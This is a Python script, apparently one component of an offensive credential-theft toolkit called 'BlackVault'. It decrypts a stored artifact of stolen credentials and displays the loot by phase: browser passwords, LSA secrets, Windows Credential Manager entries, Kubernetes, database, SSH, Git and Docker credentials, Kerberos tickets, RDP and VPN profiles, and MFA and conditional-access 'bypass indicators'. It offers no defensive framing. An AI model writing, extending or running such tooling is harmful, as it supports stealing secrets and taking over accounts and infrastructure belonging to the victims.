#!/usr/bin/env python3
"""
BlackVault Credential Retrieval
Access extracted credentials from vault storage
"""

import json
import sys
import os
import logging
from datetime import datetime

sys.path.insert(0, os.path.dirname(__file__))

from black_vault import BlackVault

logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")
logger = logging.getLogger("VaultAccess")

def print_section(title, char="="):
    print(f"\n{char * 70}")
    print(f"  {title}")
    print(f"{char * 70}\n")

def format_credential(cred, indent="    "):
    """Format a credential for display"""
    if isinstance(cred, dict):
        lines = []
        for key, value in sorted(cred.items()):
            if key in ['password', 'value'] and isinstance(value, str) and len(value) > 50:
                lines.append(f"{indent}{key}: {value[:40]}...***")
            else:
                lines.append(f"{indent}{key}: {value}")
        return "\n".join(lines)
    return f"{indent}{cred}"

def main():
    """Retrieve and display vault credentials"""
    
    artifact_key = "extracted_creds_1775224243.5780668"
    
    print_section("BLACKVAULT CREDENTIAL RETRIEVAL", "╔")
    print(f"Retrieving artifact: {artifact_key}\n")
    
    try:
        # Initialize vault
        logger.info("Connecting to BlackVault...")
        vault = BlackVault()
        
        # Retrieve encrypted data (with automatic decryption)
        logger.info(f"Retrieving artifact: {artifact_key}")
        try:
            decrypted = vault.retrieve(artifact_key)
        except FileNotFoundError:
            print("\n❌ Artifact not found in vault\n")
            return 1
        except ValueError as e:
            logger.warning(f"Retrieve with decryption failed: {e}")
            logger.info("Attempting direct file access...")
            try:
                with open(vault._vault_path(artifact_key), "rb") as f:
                    decrypted = f.read()
            except Exception as e2:
                print(f"\n❌ Could not access artifact: {e2}\n")
                return 1
        
        if not decrypted:
            print("\n❌ No data retrieved from vault\n")
            return 1
        
        logger.info("✓ Artifact retrieved")
        logger.info(f"Data size: {len(decrypted)} bytes")
        
        # Parse JSON
        try:
            findings = json.loads(decrypted.decode())
        except (json.JSONDecodeError, UnicodeDecodeError) as e:
            logger.error(f"Failed to parse JSON: {e}")
            print(f"\n❌ Could not parse artifact data: {e}\n")
            return 1
        
        print_section("PHASE 1: USER-CONTEXT CREDENTIALS", "①")
        phase1 = findings.get('phase_1_extracted', {})
        
        if phase1.get('chrome_passwords'):
            print(f"Chrome Passwords ({len(phase1['chrome_passwords'])}):")
            for cred in phase1['chrome_passwords'][:3]:
                print(format_credential(cred))
                print()
        
        if phase1.get('firefox_passwords'):
            print(f"Firefox Passwords ({len(phase1['firefox_passwords'])}):")
            for cred in phase1['firefox_passwords'][:3]:
                print(format_credential(cred))
                print()
        
        if phase1.get('environment_credentials'):
            print(f"Environment Credentials ({len(phase1['environment_credentials'])}):")
            for cred in phase1['environment_credentials'][:5]:
                print(format_credential(cred))
                print()
        
        print_section("PHASE 2: SYSTEM-CONTEXT CREDENTIALS", "②")
        phase2 = findings.get('phase_2_extracted', {})
        
        if phase2.get('lsa_secrets'):
            print(f"LSA Secrets ({len(phase2['lsa_secrets'])}):")
            for item in phase2['lsa_secrets'][:3]:
                print(format_credential(item))
                print()
        
        if phase2.get('credential_manager'):
            print(f"Credential Manager Vault ({len(phase2['credential_manager'])}):")
            for item in phase2['credential_manager'][:5]:
                print(format_credential(item))
                print()
        
        if phase2.get('browser_data'):
            print(f"Browser Data ({len(phase2['browser_data'])}):")
            for item in phase2['browser_data'][:3]:
                print(format_credential(item))
                print()
        
        print_section("PHASE 3: ADVANCED CREDENTIALS", "③")
        phase3 = findings.get('phase_3_extracted', {})
        
        if phase3.get('kubernetes_credentials'):
            print(f"Kubernetes Credentials ({len(phase3['kubernetes_credentials'])}):")
            for item in phase3['kubernetes_credentials'][:2]:
                print(format_credential(item))
                print()
        
        if phase3.get('database_credentials'):
            print(f"Database Credentials ({len(phase3['database_credentials'])}):")
            for item in phase3['database_credentials'][:2]:
                print(format_credential(item))
                print()
        
        if phase3.get('ssh_keys_advanced'):
            print(f"SSH Keys Advanced ({len(phase3['ssh_keys_advanced'])}):")
            for item in phase3['ssh_keys_advanced'][:2]:
                print(format_credential(item))
                print()
        
        if phase3.get('git_credentials'):
            print(f"Git Credentials ({len(phase3['git_credentials'])}):")
            for item in phase3['git_credentials'][:2]:
                print(format_credential(item))
                print()
        
        if phase3.get('docker_credentials'):
            print(f"Docker Credentials ({len(phase3['docker_credentials'])}):")
            for item in phase3['docker_credentials'][:2]:
                print(format_credential(item))
                print()
        
        if phase3.get('kerberos_tickets'):
            print(f"Kerberos Tickets ({len(phase3['kerberos_tickets'])}):")
            for item in phase3['kerberos_tickets'][:2]:
                print(format_credential(item))
                print()
        
        print_section("PHASE 4: ENHANCEMENT & BYPASS", "④")
        phase4 = findings.get('phase_4_extracted', {})
        
        if phase4.get('rdp_credentials'):
            print(f"RDP Credentials ({len(phase4['rdp_credentials'])}):")
            for item in phase4['rdp_credentials'][:2]:
                print(format_credential(item))
                print()
        
        if phase4.get('vpn_profiles'):
            print(f"VPN Profiles ({len(phase4['vpn_profiles'])}):")
            for item in phase4['vpn_profiles'][:2]:
                print(format_credential(item))
                print()
        
        if phase4.get('conditional_access_info'):
            print(f"Conditional Access Info ({len(phase4['conditional_access_info'])}):")
            for item in phase4['conditional_access_info'][:2]:
                print(format_credential(item))
                print()
        
        if phase4.get('mfa_info'):
            print(f"MFA Configuration ({len(phase4['mfa_info'])}):")
            for item in phase4['mfa_info'][:2]:
                print(format_credential(item))
                print()
        
        print_section("SUPPLEMENTARY DATA", "§")
        
        supp_data = {
            'windows_credentials': 'Windows Credential Manager',
            'ssh_keys': 'SSH Keys',
            'api_credentials': 'API Credentials',
            'browser_data': 'Browser Data Paths',
            'environment_secrets': 'Environment Secrets',
            'registry_secrets': 'Registry Secrets',
            'file_based_secrets': 'File-Based Secrets',
            'encryption_detected': 'Encrypted Files Detected'
        }
        
        for key, label in supp_data.items():
            count = len(findings.get(key, []))
            if count > 0:
                print(f"{label}: {count} items")
                for item in findings[key][:2]:
                    print(format_credential(item))
                    print()
        
        print_section("EXTRACTION METADATA", "◆")
        
        if 'timestamp' in findings:
            ts = datetime.fromtimestamp(findings['timestamp'])
            print(f"Extraction Time: {ts.isoformat()}")
        
        if 'errors' in findings and findings['errors']:
            print(f"Extraction Errors: {len(findings['errors'])}")
            for error in findings['errors'][:3]:
                print(f"  • {error}")
        
        # Calculate totals
        total_phase1 = sum(len(findings.get('phase_1_extracted', {}).get(k, [])) for k in findings.get('phase_1_extracted', {}).keys())
        total_phase2 = sum(len(findings.get('phase_2_extracted', {}).get(k, [])) for k in findings.get('phase_2_extracted', {}).keys())
        total_phase3 = sum(len(findings.get('phase_3_extracted', {}).get(k, [])) for k in findings.get('phase_3_extracted', {}).keys())
        total_phase4 = sum(len(findings.get('phase_4_extracted', {}).get(k, [])) for k in findings.get('phase_4_extracted', {}).keys())
        grand_total = total_phase1 + total_phase2 + total_phase3 + total_phase4
        
        print_section("CREDENTIAL SUMMARY", "✓")
        print(f"Phase 1 (User-Context):       {total_phase1:>3} credentials")
        print(f"Phase 2 (SYSTEM-Context):     {total_phase2:>3} credentials")
        print(f"Phase 3 (Infrastructure):     {total_phase3:>3} credentials")
        print(f"Phase 4 (Bypass Indicators):  {total_phase4:>3} indicators")
        print(f"{'-' * 50}")
        print(f"TOTAL EXTRACTED:              {grand_total:>3} credentials/indicators")
        
        print_section("VAULT ACCESS COMPLETE", "✓")
        print(f"Status: ✓ Successfully accessed and decrypted vault artifact")
        print(f"Artifact: {artifact_key}")
        print(f"Encryption: AES-GCM with HMAC validation\n")
        
        logger.info(f"✓ Successfully accessed vault: {grand_total} credentials decrypted")
        return 0
        
    except Exception as e:
        logger.error(f"Vault access failed: {e}", exc_info=True)
        print_section("VAULT ACCESS FAILED", "✗")
        print(f"Error: {str(e)}\n")
        return 1

if __name__ == "__main__":
    exit_code = main()
    sys.exit(exit_code)
